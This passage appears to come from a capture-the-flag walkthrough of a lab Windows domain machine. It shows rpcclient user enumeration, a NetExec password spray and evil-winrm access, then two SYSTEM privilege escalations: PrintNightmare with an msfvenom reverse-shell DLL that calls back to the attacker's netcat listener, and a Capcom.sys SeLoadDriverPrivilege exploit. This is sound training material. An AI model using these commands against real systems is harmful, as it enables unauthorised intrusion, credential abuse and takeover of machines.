</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mamasoystreamer1!
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer2@
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer3#
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer4$
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer5%
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer6^
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer7&amp;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>MamasoyStr5amer%
</span></span></span><span class=line><span class=cl><span class=go>MamasoyStr6amer^
</span></span></span><span class=line><span class=cl><span class=go>MamasoyStr7amer&amp;
</span></span></span><span class=line><span class=cl><span class=go>MamasoyStr8amer*
</span></span></span><span class=line><span class=cl><span class=go>MamasoyStr9amer(
</span></span></span><span class=line><span class=cl><span class=go>MamasoyStr10amer)
</span></span></span><span class=line><span class=cl><span class=go>Mamasoystreamer1
</span></span></span></code></pre></div><p>We can then use <code>Microsoft RPC</code> along with <code>rpcclient</code> enumerate users in the system:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rpcclient -U &#34;Whisky%MamasoyStream2er@&#34; 192.168.69.69 -c &#39;enumdomusers&#39; | grep -o &#39;\[.*\]&#39; | sed &#39;s/\[//;s/\]//&#39; | awk -F &#39;rid&#39; &#39;{print $1}&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Administrador
</span></span></span><span class=line><span class=cl><span class=go>Invitado
</span></span></span><span class=line><span class=cl><span class=go>krbtgt
</span></span></span><span class=line><span class=cl><span class=go>DefaultAccount
</span></span></span><span class=line><span class=cl><span class=go>Orujo
</span></span></span><span class=line><span class=cl><span class=go>Ginebra
</span></span></span><span class=line><span class=cl><span class=go>Whisky
</span></span></span><span class=line><span class=cl><span class=go>Hendrick
</span></span></span><span class=line><span class=cl><span class=go>Chivas Regal
</span></span></span><span class=line><span class=cl><span class=go>Whisky2
</span></span></span><span class=line><span class=cl><span class=go>JB
</span></span></span><span class=line><span class=cl><span class=go>Chivas
</span></span></span><span class=line><span class=cl><span class=go>beefeater
</span></span></span><span class=line><span class=cl><span class=go>CarlosV
</span></span></span><span class=line><span class=cl><span class=go>RedLabel
</span></span></span><span class=line><span class=cl><span class=go>Gordons
</span></span></span></code></pre></div><p>We can then attempt a <code>Password Spray</code> with the potential password list against these users. First, use <code>rpcclient</code> output to generate a list of potential users:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rpcclient -U &#34;Whisky%MamasoyStream2er@&#34; 192.168.69.69 -c &#39;enumdomusers&#39; | grep -o &#39;\[.*\]&#39; | sed &#39;s/\[//;s/\]//&#39; | awk -F &#39;rid&#39; &#39;{print $1}&#39; &gt; potential_users.txt
</span></span></span></code></pre></div><p>Then, do a <code>Password Spray</code> against these users using the passwords found using <code>NetExec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 192.168.69.69 -u potential_users.txt -p ah.txt --continue-on-success | grep &#39;\[+\]&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@
</span></span></span></code></pre></div><p>and we get credentials: <code>Whisky:MamasoyStream2er@</code>.</p><p>We remember from the first scan to <code>SMB</code> shares, that there was a printer message. We can check if we have something in <code>Microsoft RPC</code> service using <code>rpcclient</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rpcclient -U &#34;Whisky%MamasoyStream2er@&#34; 192.168.69.69 -c &#39;enumprinters&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        flags:[0x800000]
</span></span></span><span class=line><span class=cl><span class=go>        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
</span></span></span><span class=line><span class=cl><span class=go>        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
</span></span></span><span class=line><span class=cl><span class=go>        comment:[Soy Hacker y arreglo impresoras]
</span></span></span></code></pre></div><p>We then check if one of our users is valid:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 192.168.69.69 -u potential_users.txt -p &#39;TurkisArrusPuchuchuSiu1&#39; | grep &#39;\[+\]&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1
</span></span></span></code></pre></div><p>and we get credentials: <code>Chivas Regal:TurkisArrusPuchuchuSiu1</code>.</p><p>We can check if this user is allowed to log in via <code>WinRM</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 192.168.69.69 -u &#39;Chivas Regal&#39; -p &#39;TurkisArrusPuchuchuSiu1&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)
</span></span></span></code></pre></div><p>and we can.</p><p>We can finally connect as this user with <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 192.168.69.69 -u &#39;Chivas Regal&#39; -p &#39;TurkisArrusPuchuchuSiu1&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt;
</span></span></span></code></pre></div><p>and read the user flag at this user&rsquo;s Desktop.</p><hr><h2 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>We find 2 ways to pwn the system.</p><hr><h3 id=privesc-1-use-printnightmare>Privesc #1: Use <code>PrintNightmare</code>
<a class=heading-link href=#privesc-1-use-printnightmare><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>We can check if this system might be vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-34527 class=external-link target=_blank rel=noopener>CVE-2021-34527</a>, a.k.a., <code>PrintNightmare</code>. For this, we can run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ impacket-rpcdump @192.168.69.69 | grep -E &#39;MS-RPRN|MS-PAR&#39;
</span></span></span><span class=line><span class=cl><span class=go>Protocol: [MS-RPRN]: Print System Remote Protocol
</span></span></span><span class=line><span class=cl><span class=go>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
</span></span></span></code></pre></div><p><code>MS-PAR</code>. and <code>MS-RPRN</code> protocols are enabled. This is a good sign.</p><p>We can then use <a href=https://github.com/JohnHammond/CVE-2021-34527 class=external-link target=_blank rel=noopener>this Powershell module for PrintNightmare</a>. Then, upload it to the system with <code>upload</code> function from <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload CVE-2021-34527.ps1 .\printNightmare.ps1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/OtherMachines/TheHackersLabs/Pacharan/exploits/CVE-2021-34527.ps1 to C:\Users\Chivas Regal\Documents\.\printNightmare.ps1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 238084 bytes of 238084 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span></code></pre></div><p>and import it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Import-Module .\printNightmare.ps1
</span></span></span></code></pre></div><p>Once uploaded and imported, I attempt to create a user running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Invoke-Nightmare -DriverName &#34;Xerox&#34; -NewUser &#34;gunzf0x&#34; -NewPassword &#34;gunzf0x123$!&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] created payload at C:\Users\Chivas Regal\AppData\Local\Temp\nightmare.dll
</span></span></span><span class=line><span class=cl><span class=go>[+] using pDriverPath = &#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\mxdwdrv.dll&#34;
</span></span></span><span class=line><span class=cl><span class=go>[+] added user gunzf0x as local administrator
</span></span></span><span class=line><span class=cl><span class=go>[+] deleting payload from C:\Users\Chivas Regal\AppData\Local\Temp\nightmare.dll
</span></span></span></code></pre></div><p>Even if the output says it was created, if I check users in the system my user is not there:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cuentas de usuario de \\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrador            beefeater                CarlosV
</span></span></span><span class=line><span class=cl><span class=go>Chivas                   Chivas Regal             DefaultAccount
</span></span></span><span class=line><span class=cl><span class=go>Ginebra                  Gordons                  Hendrick
</span></span></span><span class=line><span class=cl><span class=go>Invitado                 JB                       krbtgt
</span></span></span><span class=line><span class=cl><span class=go>Orujo                    RedLabel                 Whisky
</span></span></span><span class=line><span class=cl><span class=go>Whisky2
</span></span></span><span class=line><span class=cl><span class=go>El comando se ha completado con uno o m¬†s errores.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; net localgroup administradores
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Nombre de alias      administradores
</span></span></span><span class=line><span class=cl><span class=go>Comentario           Los administradores tienen acceso completo y sin restricciones al equipo o dominio
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Miembros
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrador
</span></span></span><span class=line><span class=cl><span class=go>Administradores de empresas
</span></span></span><span class=line><span class=cl><span class=go>Admins. del dominio
</span></span></span><span class=line><span class=cl><span class=go>Se ha completado el comando correctamente.
</span></span></span></code></pre></div><p>I then attempt to run it with the &ldquo;defualt&rdquo; option. But, again, the output says it worked, but the user is not created:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Invoke-Nightmare
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] using default new user: adm1n
</span></span></span><span class=line><span class=cl><span class=go>[+] using default new password: P@ssw0rd
</span></span></span><span class=line><span class=cl><span class=go>[+] created payload at C:\Users\Chivas Regal\AppData\Local\Temp\nightmare.dll
</span></span></span><span class=line><span class=cl><span class=go>[+] using pDriverPath = &#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\mxdwdrv.dll&#34;
</span></span></span><span class=line><span class=cl><span class=go>[+] added user  as local administrator
</span></span></span><span class=line><span class=cl><span class=go>[+] deleting payload from C:\Users\Chivas Regal\AppData\Local\Temp\nightmare.dll
</span></span></span></code></pre></div><p>I think this problem might be due to the machine being in spanish (changing the group <code>administrators</code> to <code>administradores</code>).</p><p>Reading the <a href=https://github.com/JohnHammond/CVE-2021-34527 class=external-link target=_blank rel=noopener>Github repository</a> for the script also provides a flag <code>-DLL</code> to execute a <code>.dll</code> file. For this reason, I create a malicious <code>.dll</code> file with <code>msfvenom</code> in my attacker machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.2 LPORT=443 -f dll -o rev.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span></span><span class=line><span class=cl><span class=go>[-] No arch selected, selecting arch: x64 from the payload
</span></span></span><span class=line><span class=cl><span class=go>No encoder specified, outputting raw payload
</span></span></span><span class=line><span class=cl><span class=go>Payload size: 460 bytes
</span></span></span><span class=line><span class=cl><span class=go>Final size of dll file: 9216 bytes
</span></span></span><span class=line><span class=cl><span class=go>Saved as: rev.dll
</span></span></span></code></pre></div><p>where <code>192.168.69.2</code> is my attacker IP address and <code>443</code> is the port I will start listening with <code>netcat</code>.</p><p>Again, we upload it to the target machine using <code>upload</code> function from <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload rev.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/OtherMachines/TheHackersLabs/Pacharan/exploits/rev.dll to C:\Users\Chivas Regal\Documents\rev.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 12288 bytes of 12288 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span></code></pre></div><p>Since the space in <code>Chivas Regal</code> username can cause a conflict in the absolute path, I will copy this file to another directory. Based on <a href=https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md class=external-link target=_blank rel=noopener>AppLockerBypasses page</a>, I will select the path:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\System32\spool\drivers\color
</span></span></span></code></pre></div><p>that should not have permission problems to write files there.</p><p>We then copy the malicious <code>.dll</code> file there with <code>evil-winrm</code> session:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; copy rev.dll C:\Windows\System32\spool\drivers\color\rev.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; dir C:\Windows\System32\spool\drivers\color
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directorio: C:\Windows\System32\spool\drivers\color
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM           1058 D50.camp
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM           1079 D65.camp
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM            797 Graphics.gmmp
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM            838 MediaSim.gmmp
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM            786 Photo.gmmp
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM            822 Proofing.gmmp
</span></span></span><span class=line><span class=cl><span class=go>-a----        9/17/2024   7:13 AM           9216 rev.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM         218103 RSWOP.icm
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM           3144 sRGB Color Space Profile.icm
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM          17155 wscRGB.cdmp
</span></span></span><span class=line><span class=cl><span class=go>-a----        7/16/2016   3:18 PM           1578 wsRGB.cdmp
</span></span></span></code></pre></div><p>I will then start a listener with <code>netcat</code> on port <code>443</code> in my attacker machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>In the victim machine, I execute the malicious <code>.dll</code> file using <code>-DLL</code> flag along with <code>Invoke-Nightmare</code> malicious module:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Invoke-Nightmare -DLL &#39;C:\Windows\System32\spool\drivers\color\rev.dll&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] using user-supplied payload at C:\Windows\System32\spool\drivers\color\rev.dll
</span></span></span><span class=line><span class=cl><span class=go>[!] ignoring NewUser and NewPassword arguments
</span></span></span><span class=line><span class=cl><span class=go>[+] using pDriverPath = &#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\mxdwdrv.dll&#34;
</span></span></span><span class=line><span class=cl><span class=go>[!] AddPrinterDriverEx failed
</span></span></span><span class=line><span class=cl><span class=go>At line:1 char:1
</span></span></span><span class=line><span class=cl><span class=go>+ Invoke-Nightmare -DLL &#39;C:\Windows\System32\spool\drivers\color\rev.dl ...
</span></span></span><span class=line><span class=cl><span class=go>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span></span><span class=line><span class=cl><span class=go>    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
</span></span></span><span class=line><span class=cl><span class=go>    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-Nightmare
</span></span></span></code></pre></div><p>it returned an error. However, in my <code>netcat</code> listener, I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [192.168.69.2] from (UNKNOWN) [192.168.69.69] 58002
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Versin 10.0.14393]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2016 Microsoft Corporation. Todos los derechos reservados.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span></code></pre></div><p>we are <code>nt authority/system</code>. GG.</p><hr><h3 id=privesc-2-use-seloaddriverprivilege-privilege>Privesc #2: Use <code>SeLoadDriverPrivilege</code> privilege
<a class=heading-link href=#privesc-2-use-seloaddriverprivilege-privilege><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>If we check what are the privileges of <code>Chivas Regal</code> user, we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>INFORMACI√†N DE PRIVILEGIOS
</span></span></span><span class=line><span class=cl><span class=go>--------------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Nombre de privilegio          Descripci¬¢n                                     Estado
</span></span></span><span class=line><span class=cl><span class=go>============================= =============================================== ==========
</span></span></span><span class=line><span class=cl><span class=go>SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
</span></span></span><span class=line><span class=cl><span class=go>SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Omitir comprobaci¬¢n de recorrido                Habilitada
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada
</span></span></span></code></pre></div><p>We can see the <code>SeLoadDriverPrivilege</code> privilege enabled.</p><p>We can use <a href=https://github.com/k4sth4/SeLoadDriverPrivilege class=external-link target=_blank rel=noopener>this repository</a> that provides all the necessary files to exploit this privilege. We can clone this repository in our attacker machine. Then, pass the files using, again, <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload Capcom.sys C:\Windows\System32\spool\drivers\color\Capcom.sys
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/HTB/HTBMachines/Medium/Fuse/exploits/SeLoadDriverPrivilege/Capcom.sys to C:\Windows\System32\spool\drivers\color\Capcom.sys
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 14100 bytes of 14100 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload ExploitCapcom.exe C:\Windows\System32\spool\drivers\color\ExploitCapcom.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/HTB/HTBMachines/Medium/Fuse/exploits/SeLoadDriverPrivilege/ExploitCapcom.exe to C:\Windows\System32\spool\drivers\color\ExploitCapcom.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 387752 bytes of 387752 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span></code></pre></div><p>Then, load the <code>.sys</code> file using <code>LOAD</code> command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; C:\Windows\System32\spool\drivers\color\ExploitCapcom.exe LOAD C:\Windows\System32\spool\drivers\color\Capcom.sys
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Service Name: aabvavbo
</span></span></span><span class=line><span class=cl><span class=go>[+] Enabling SeLoadDriverPrivilege
</span></span></span><span class=line><span class=cl><span class=go>[+] SeLoadDriverPrivilege Enabled
</span></span></span><span class=line><span class=cl><span class=go>[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\?????????????????
</span></span></span><span class=line><span class=cl><span class=go>NTSTATUS: 00000000, WinError: 0
</span></span></span></code></pre></div><p>and check if this has worked, testing with <code>whoami</code> command with <code>EXPLOIT</code> module:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; C:\Windows\System32\spool\drivers\color\ExploitCapcom.exe EXPLOIT whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Capcom.sys exploit
</span></span></span><span class=line><span class=cl><span class=go>[*] Capcom.sys handle was obtained as 0000000000000064
</span></span></span><span class=line><span class=cl><span class=go>[*] Shellcode was placed at 00000216F7BE0008
</span></span></span><span class=line><span class=cl><span class=go>[+] Shellcode was executed
</span></span></span><span class=line><span class=cl><span class=go>[+] Token stealing was successful
</span></span></span><span class=line><span class=cl><span class=go>[+] Command Executed
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span></code></pre></div><p>the command is being executed, and the output is <code>nt authority/system</code>. Therefore, we are executing commands as this user.</p><p>Finally, we can go to <code>Reverse Shell Generator</code> page (<a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>), search for <code>PowerShell #3 (Base64)</code> payload, put our attacker IP address and listening port with <code>netcat</code> (that in my cases are <code>192.168.69.2</code> and <code>443</code>, respectively), and generate a payload. Before executing the payload, start a <code>netcat</code> listener in our attacker machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
